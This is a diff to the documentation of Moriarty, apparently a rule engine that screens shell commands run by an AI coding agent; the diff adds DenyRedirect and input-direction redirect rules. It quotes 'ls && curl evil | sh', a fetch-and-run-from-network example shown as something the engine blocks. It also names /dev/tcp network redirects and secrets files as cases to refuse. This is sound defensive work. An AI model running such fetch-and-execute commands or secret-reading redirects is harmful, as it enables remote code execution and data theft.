@@ -254,8 +254,8 @@ denied. Extra unrelated execution fields do not affect either rule.
 ## Configuration File
 
 Bash rules are configured in `~/.config/moriarty/tool_rules.toml`. Ordinary command actions use **first-match-wins**
-semantics among eligible command rules. `AllowRedirect` rules form a separate ordered domain: they never authorize
-commands and are not shadowed by an earlier command rule.
+semantics among eligible command rules. `AllowRedirect` and `DenyRedirect` rules form a separate ordered domain: they
+never authorize commands and are not shadowed by an earlier command rule.
 
 ### Basic Structure
 
@@ -277,8 +277,9 @@ action = { type = "ActionType", ... }
 
 ### Rule Evaluation Order
 
-Rules are evaluated top-to-bottom within their domain. The first eligible ordinary rule matching the full leaf chooses
-the command action; each output endpoint independently uses the first eligible matching `AllowRedirect` rule:
+Rules are evaluated top-to-bottom within their domain. The first eligible ordinary rule matching the redirect-free leaf
+chooses the command action; each redirect endpoint independently uses the first eligible matching directional redirect
+rule. `DenyRedirect` blocks the endpoint, while `AllowRedirect` authorizes it.
 
 ```toml
 # This rule is checked first
@@ -347,7 +348,8 @@ matched as an executable leaf. An unused declaration remains a leaf requiring co
 Unsupported configured-alias assignments or references do **not** make Moriarty abandon all leaf analysis. The affected
 leaf is matched normally, but an Allow is capped at Ask; a Deny still applies, including a Deny on a dangerous later
 leaf. Command substitution, backticks, arithmetic substitution, process substitution, and the other existing shell bail
-conditions remain whole-command fail-safe cases.
+conditions remain whole-command fail-safe cases; a raw command Deny or a DenyRedirect matching a confidently parsed
+static endpoint still blocks, while every other outcome prompts.
 
 ### Mutation Barriers
 
@@ -361,16 +363,19 @@ against stale paths without needing per-builtin option semantics.
 
 Redirect targets are classified after known alias expansion. A supported alias may therefore resolve to a project-local
 or explicitly approved external endpoint, but the binding still grants no authority by itself. `/dev/null`, descriptors,
-and every other output endpoint require their own `AllowRedirect` match. An alias expansion in command position also
-requires confirmation; `exec` and wrapper barriers likewise prevent a path alias from auto-authorizing a derived
+and every other redirect endpoint require direction-matching redirect policy. An alias expansion in command position
+also requires confirmation; `exec` and wrapper barriers likewise prevent a path alias from auto-authorizing a derived
 executable name.
 
 Use `moriarty test bash-rules --cwd <dir> --explain '<command>'` to see consumed bindings, original leaf source,
-alias-expanded text, final cwd-normalized match text, confirmation reasons, matching rules, unanalyzable Modify
-rewrites, and the merged decision. Normal `moriarty test bash-rules`, `--explain`, replay, and the live hook consume the
-same completed analysis, including one-pass `ArgumentFilter` revalidation. Suggestions consume the same canonical
-original policy analysis without computing continuations they do not use. Explain adds diagnostics without evaluating
-policy again.
+alias-expanded text, final cwd-normalized match text, each endpoint's direction and allowing or denying redirect rule,
+confirmation reasons, unanalyzable Modify rewrites, and the merged decision. Normal `moriarty test bash-rules`,
+`--explain`, replay, and the live hook consume the same completed analysis, including one-pass `ArgumentFilter`
+revalidation. Suggestions consume the same canonical original policy analysis without computing continuations they do
+not use. Explain adds diagnostics without evaluating policy again. With `--json`, each leaf's direction-neutral endpoint
+array uses the `redirects` key. A matched endpoint has a typed `decision` of `allowed` or `denied`; `failure` is
+reserved for resolution failures and endpoints with no eligible allow rule, while a denied endpoint's configured reason
+appears in `matched.action_summary`.
 
 ## Permission Modes
 
@@ -419,7 +424,8 @@ recorded cwd are excluded from replay and suggestion mining, with the excluded c
 cannot be reproduced safely without the original base directory. Historical logs do not record HOME, so replay and
 suggestion mining resolve tilde targets against the current process HOME and live filesystem. Strict lint warns on
 `modes = []`, missing mode-overlapping redirect policy, and shadowing between same-domain rules whose mode eligibility
-overlaps.
+overlaps. A redirect rule is shadowed only when the earlier rule covers every direction and locality class the later
+rule could match; partial overlap is not reported as unreachable.
 
 ## Rule Actions
 
@@ -434,11 +440,18 @@ pattern = "^git\\s+status"
 action = { type = "Allow" }
 ```
 
-### AllowRedirect
+### AllowRedirect and DenyRedirect
 
-Authorize one output redirect endpoint without authorizing the command that contains it. A leaf auto-executes only when
-an ordinary `Allow` rule matches the existing full leaf text **and** every output endpoint matches an eligible
-`AllowRedirect` rule.
+Redirect rules match one resolved endpoint without authorizing the command that contains it. Existing `AllowRedirect`
+rules default to `direction = "output"`; use `"input"` for read endpoints and `"both"` for either direction. A
+read-write `<>` endpoint requires an allowing `"both"` rule. `DenyRedirect` defaults to both directions and blocks any
+endpoint operation in its scope. Put specific denies before broader allows because the redirect domain is
+first-match-wins.
+
+For leaves that also contain a command or assignment, ordinary rules see cwd-normalized text with all redirect syntax
+removed. A leaf auto-executes only when an ordinary `Allow` rule matches that command text, no `DenyRedirect` matches,
+and every redirect endpoint matches an eligible `AllowRedirect` rule. Redirect-only leaves such as `> out` and `< input`
+retain their full syntax in the command domain, so endpoint policy alone cannot authorize shell execution.
 
 ```toml
 [[bash_rules]]
@@ -447,9 +460,19 @@ pattern = "^echo($|\\s)"
 action = { type = "Allow" }
 
 [[bash_rules]]
+name = "deny-secret-input"
+pattern = "^secrets/"
+action = { type = "DenyRedirect", value = "Secrets cannot be redirect inputs", direction = "input" }
+
+[[bash_rules]]
 name = "allow-project-build-redirects"
 pattern = "^build/"
 action = { type = "AllowRedirect", allow_local = true }
+
+[[bash_rules]]
+name = "allow-project-fixture-input"
+pattern = "^fixtures/"
+action = { type = "AllowRedirect", allow_local = true, direction = "input" }
 
 [[bash_rules]]
 name = "allow-tool-cache"
@@ -467,23 +490,25 @@ pattern = "^&1$"
 action = { type = "AllowRedirect" }
 ```
 
-A redirect rule's regex sees only the resolved endpoint, never the command. Resolved project paths are cwd-relative (`.`
-for cwd itself), paths under the resolved current home use `~/...`, and other paths use canonical absolute form. Device
-and special-file endpoints always use canonical absolute form, so an exact `/dev/null` rule is independent of cwd. A
-cwd-relative filename beginning with `~` or `&` receives a `./` prefix; for example, the ordinary file `&1` matches
-`./&1`, while descriptor duplication still matches `&1`. Paths that cannot be represented as UTF-8 fail closed instead
-of using a lossy match string. `allow_local = true` additionally requires a filesystem endpoint to remain under
-canonical cwd; it cannot authorize `/dev/null`, another device, or a descriptor token such as `&1`, `&2`, or `&-`.
+A redirect rule's regex sees only the resolved endpoint, never the command. `direction` is optional on both actions:
+`AllowRedirect` defaults to `"output"`, while `DenyRedirect` defaults to `"both"`. Resolved project paths are
+cwd-relative (`.` for cwd itself), paths under the resolved current home use `~/...`, and other paths use canonical
+absolute form. Device and special-file endpoints always use canonical absolute form, so an exact `/dev/null` rule is
+independent of cwd. A cwd-relative filename beginning with `~` or `&` receives a `./` prefix; for example, the ordinary
+file `&1` matches `./&1`, while descriptor duplication still matches `&1`. Paths that cannot be represented as UTF-8
+fail closed instead of using a lossy match string. `allow_local = true` additionally requires a filesystem endpoint to
+remain under canonical cwd; it cannot authorize `/dev/null`, another device, or a descriptor token such as `&1`, `&2`,
+or `&-`.
 
 Existing symlinks are resolved. For a target that does not exist yet, Moriarty canonicalizes its deepest existing
 ancestor and safely rebuilds the missing suffix; broken links, non-directory ancestors, and a `..` escape fail closed.
 Unsafe virtual paths under `/proc/self`, `/proc/thread-self`, `/dev/fd`, `/dev/std*`, `/dev/tcp`, or `/dev/udp`,
 including targets reached through symlink chains, also fail closed because the hook cannot resolve them as the later
-Bash process or safely model Bash-specific network redirects. This is
-a pre-execution check: the filesystem can still change between authorization and shell execution (the unavoidable TOCTOU
-limitation). One two-second deadline covers the entire live Bash evaluation, including parsing, matching, path
-resolution, Modify checks, and an ArgumentFilter recheck. Timeout or blocking-task failure prompts with no rule
-provenance; synchronous test, replay, explain, and suggestion evaluation has no deadline.
+Bash process or safely model Bash-specific network redirects. This is a pre-execution check: the filesystem can still
+change between authorization and shell execution (the unavoidable TOCTOU limitation). One two-second deadline covers the
+entire live Bash evaluation, including parsing, matching, path resolution, Modify checks, and an ArgumentFilter recheck.
+Timeout or blocking-task failure prompts with no rule provenance; synchronous test, replay, explain, and suggestion
+evaluation has no deadline.
 
 ### Deny
 
@@ -507,12 +532,16 @@ pattern = "^(docker\\s+system\\s+prune)"
 action = { type = "Modify", value = "$1 --dry-run" }
 ```
 
-The rewritten command's output endpoints are checked against `AllowRedirect` before Moriarty returns the modification;
-an unresolved or unauthorized endpoint prompts instead. If the rewritten command contains a construct the splitter
-cannot analyze, it also prompts even when no output redirect is apparent because Moriarty cannot prove that no endpoint
-will be opened. Alias or shell-state uncertainty in a rewritten leaf has the same fail-closed result. **Security
-Warning**: Modify actions use unescaped capture group replacement. Avoid patterns like `^docker (.*)` that capture
-arbitrary input. Use specific patterns like `^(docker\\s+system\\s+prune)$` instead.
+The original leaf's redirects are appended to the capture-expanded replacement in source order, preserving their
+operators and target spelling. Path-alias declarations referenced by those redirects are retained in the modified
+command. For an analyzable rewrite, Moriarty returns the modification only when parsing confirms that the appended
+redirects remain attached to the same replacement leaf; a trailing separator or comment that would detach or swallow
+them prompts instead. Unanalyzable rewrites follow the fail-closed check below. Every original or replacement endpoint
+is checked: a denied endpoint blocks, while an unresolved or unauthorized endpoint prompts. If the rewritten command
+contains a construct the splitter cannot analyze, it also prompts when no redirect is apparent because Moriarty cannot
+prove that no endpoint will be opened. Alias or shell-state uncertainty in a rewritten leaf has the same fail-closed
+result. **Security Warning**: Modify actions use unescaped capture group replacement. Avoid patterns like `^docker (.*)`
+that capture arbitrary input. Use specific patterns like `^(docker\\s+system\\s+prune)$` instead.
 
 ### Ask
 
@@ -528,14 +557,14 @@ action = { type = "Ask" }
 ### ArgumentFilter
 
 Structurally remove, add, or replace command arguments before execution. Unlike `Modify` which uses regex capture
-groups, `ArgumentFilter` uses the brush parse's discrete arguments and source spans, making it easier to handle flags
-regardless of their position. Unchanged quoting, expansions, redirect operators, leading `time`/`time -p` and `!`
-pipeline prefixes, and a trailing background `&` remain intact; replacement and added values are shell-quoted. Redirect
-endpoint policy therefore still applies after filtering.
+groups, `ArgumentFilter` matches normalized brush argument values but rewrites alias-expanded source spans, making it
+easier to handle flags without activating unchanged quoted, escaped, or literal-glob syntax. Unchanged quoting,
+expansions, redirect operators, leading `time`/`time -p` and `!` pipeline prefixes, and a trailing background `&` remain
+intact; replacement and added values are shell-quoted. Redirect endpoint policy therefore still applies after filtering.
 
 **Important**: After filtering, the modified command is automatically re-validated against all rules. The filtered
-command must match an `Allow` rule and every output endpoint must match `AllowRedirect` (or the command must be manually
-approved) to execute.
+command must match an `Allow` rule, no endpoint may match `DenyRedirect`, and every redirect endpoint must match a
+correctly directed `AllowRedirect` rule (or the command must be manually approved) to execute.
 
 #### Removing Arguments
 
@@ -764,23 +793,25 @@ single command, not a whole pipeline.
   in [Path Alias Analysis](#path-alias-analysis). Cwd normalization then applies to the expanded value, preserving
   direct-literal rule behavior.
 - **Operators split compound commands into leaves**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
-  `cmd && ls`. Redirect syntax remains in each leaf's command match text for regex compatibility, while authorization
-  also evaluates every output endpoint independently. A redirect-only leaf such as `> out` therefore needs an ordinary
-  command rule matching `> out` plus a redirect rule authorizing `out`; a rule for the bare target is not enough.
-- **Command and endpoint policy are conjunctive**: an ordinary command rule must Allow the leaf and one eligible
-  `AllowRedirect` rule must authorize each output endpoint. A command with `> one 2> two` needs both targets approved;
-  repeating one redirect rule records that contributor only once.
-- **All supported output-side forms require endpoint policy**, including `>`, `>>`, `>|`, `&>`, `&>>`, `>&file`, `<>`,
-  `/dev/null` and other device paths, plus descriptor duplication or closure (`2>&1`, `>&2`, `>&-`). `> 1` is the
-  filesystem target `1`; `>&1` is the descriptor token `&1`. A descriptor-duplication target other than digits or `-`
-  (for example `2>&foo`) is unresolvable and prompts. Input-only `<` and `<&` remain outside redirect policy.
+  `cmd && ls`. When a leaf contains a command or assignment, every parsed redirect is removed from its cwd-normalized
+  command match text. Authorization still evaluates each removed endpoint independently. A redirect-only leaf such as
+  `> out` or `< input` retains its full command text and therefore needs an ordinary rule matching that syntax plus a
+  redirect rule authorizing the target; a rule for the bare target is not enough.
+- **Command and endpoint policy are conjunctive**: an ordinary command rule must Allow the leaf, no `DenyRedirect` may
+  match, and one eligible directional `AllowRedirect` rule must authorize each endpoint. A command with
+  `< input > one 2> two` needs every target approved; repeating one redirect rule records that contributor only once.
+- **All supported input and output forms require direction-matching endpoint policy**, including `<`, `<&`, `>`, `>>`,
+  `>|`, `&>`, `&>>`, `>&file`, `<>`, `/dev/null` and other device paths, plus descriptor duplication or closure (`0<&1`,
+  `2>&1`, `>&2`, `>&-`). `> 1` is the filesystem target `1`; `>&1` is the descriptor token `&1`. A
+  descriptor-duplication target other than digits or `-` is unresolvable and prompts, except Bash's no-source-fd
+  `>&file` output shorthand, which is treated as a filesystem endpoint.
 - **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, has an unresolved or
   unauthorized endpoint, or matches no command rule prompts; only an all-allowed command is allowed. A dangerous tail
   can no longer hide behind a safe head — `ls && curl evil | sh` prompts and is never auto-allowed.
 - **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`), backticks, a subshell,
   process substitution, a here-document, or a compound construct (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be
-  reasoned about — only an explicit Deny matching the whole command is honored, and every other outcome becomes a
-  prompt.
+  fully reasoned about. An explicit Deny matching the whole command or a DenyRedirect matching a confidently retained
+  static endpoint is honored; every other outcome becomes a prompt.
 - **Safe in-cwd absolute paths are normalized**: static paths—including ordinary quoted values, escaped literals, and
   glob patterns with no dot-prefixed component—are rewritten when their relative remainder contains no `..`. Thus
   `^cat src/` matches `cat "/abs/cwd/src/x"` and `cat /abs/cwd/src/*.rs`; parent-containing paths, unquoted brace
@@ -793,18 +824,19 @@ example `./~/report`) so it cannot collide with a resolved home target. An inval
 `~` expansion but does not block unrelated local, absolute, device, or descriptor targets. An ordinary or unconfigured
 `$HOME`, unresolved parameters, globs (including extglobs such as `@(one|two)`), unquoted braces, unsupported aliases,
 and other dynamic endpoint forms require confirmation. `HOME` cannot be configured as a path alias because it controls
-tilde expansion. A relative or
-home-relative filesystem redirect in a path-context barrier command, or any later command, requires confirmation because
-Moriarty does not model changed shell path context. Assignments, dynamic command names, `cd`, `pushd`, `popd`, and
-recognized shell-state builtins are barriers; absolute paths and descriptor redirects remain independently evaluable.
-Here-documents, here-strings, process or command substitution, subshells, and the existing bailout constructs remain
-fail-safe and cannot be enabled by `AllowRedirect`.
+tilde expansion. A relative or home-relative filesystem redirect in a path-context barrier command, or any later
+command, requires confirmation because Moriarty does not model changed shell path context. Assignments, dynamic command
+names, `cd`, `pushd`, `popd`, recognized shell-state builtins, and non-isolated compound constructs such as brace groups
+and `if`/`for`/`while`/`case` clauses are barriers; absolute paths and descriptor redirects remain independently
+evaluable. Here-documents, here-strings, process or command substitution, subshells, and the existing bailout constructs
+remain fail-safe and cannot be enabled by `AllowRedirect`; matching `DenyRedirect` rules still block confidently parsed
+static endpoints.
 
 A pattern still has to guard a program's **own** ability to run code or write files — for example `find -exec`,
 `sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see them.
 
-Preview the full command match, each endpoint's original and resolved form, locality, matching redirect rule, final
-primary rule, and ordered contributors with:
+Preview the original leaf, redirect-free command match, each endpoint's original and resolved form, locality, matching
+redirect rule, final primary rule, and ordered contributors with:
 
 ```bash
 moriarty test bash-rules --mode plan --explain '<command>'
@@ -816,23 +848,25 @@ Generate exact endpoint rules from recorded prompts explicitly:
 moriarty rules suggest --action allow-redirect --match exact
 ```
 
-For ordinary command suggestions, prefix and fuzzy generation omit leaves whose normalized match text does not begin
-with the parsed program; exact generation remains available for those leaves. Redirect suggestions are never chosen by
-default. Prefix and fuzzy redirect suggestions are rejected before logs are read. The generator resolves all targets in
-a record using one cwd context and the current filesystem, omits leaves containing any dynamic or
+Ordinary exact suggestions use redirect-free command text. Prefix and fuzzy suggestions use the parsed program value, so
+a prefix redirect such as `>report cargo build` clusters under `cargo`; leaves whose normalized command text still does
+not begin with that parsed value (for example unsupported command-name shapes) are omitted. Redirect suggestions are
+never chosen by default. Prefix and fuzzy redirect suggestions are rejected before logs are read. The generator resolves
+all targets in a record using one cwd context and the current filesystem, omits leaves containing any dynamic or
 shell-context-dependent endpoint as well as command-blocked leaves, filters targets already covered by active redirect
-policy, and sets `allow_local = true` only for resolved project paths. Ordinary `Allow` suggestions omit leaves already
-allowed by active command policy; `Ask` and `Deny` suggestions retain a command-allowed leaf when redirect policy still
-prompts. Historical rows without cwd are excluded. Local suggestions match cwd-relative names in every project; they are
-not scoped to the repository where they were mined. Review generated rules before installing them; strict lint warns
-about broad redirect authority.
+policy, preserves each endpoint's input/output/both direction, and sets `allow_local = true` only for resolved project
+paths. Ordinary `Allow` suggestions omit leaves already allowed by active command policy; `Ask` and `Deny` suggestions
+retain a command-allowed leaf when redirect policy still prompts. Historical rows without cwd are excluded. Local
+suggestions match cwd-relative names in every project; they are not scoped to the repository where they were mined.
+Review generated rules before installing them; strict lint warns about broad redirect authority.
 
 ## Security Best Practices
 
 ### 1. Let the Engine Handle Shell Metacharacters
 
 Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks, subshells, …) bail to a
-prompt, an allow-rule no longer needs character-class exclusions like ``[^|&;$`()<>{}]`` to stay safe:
+prompt unless a command or endpoint deny blocks first, an allow-rule no longer needs character-class exclusions like
+``[^|&;$`()<>{}]`` to stay safe:
 
 ```toml
 # Fine: the splitter removes operators and bails on substitution
@@ -920,8 +954,8 @@ name = "cargo-doc-no-browser"
 pattern = "^cargo doc\\b.*--open"
 action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser not useful for Claude" }
 
-# Allow the safe cargo subcommands. The splitter handles pipes and chaining; output redirects
-# additionally need an AllowRedirect rule for their destination.
+# Allow the safe cargo subcommands. The splitter handles pipes and chaining; redirects
+# additionally need direction-matching AllowRedirect rules for every endpoint.
 [[bash_rules]]
 name = "cargo-safe-commands"
 pattern = "^cargo (build|check|test|clippy|fmt|doc)\\b"
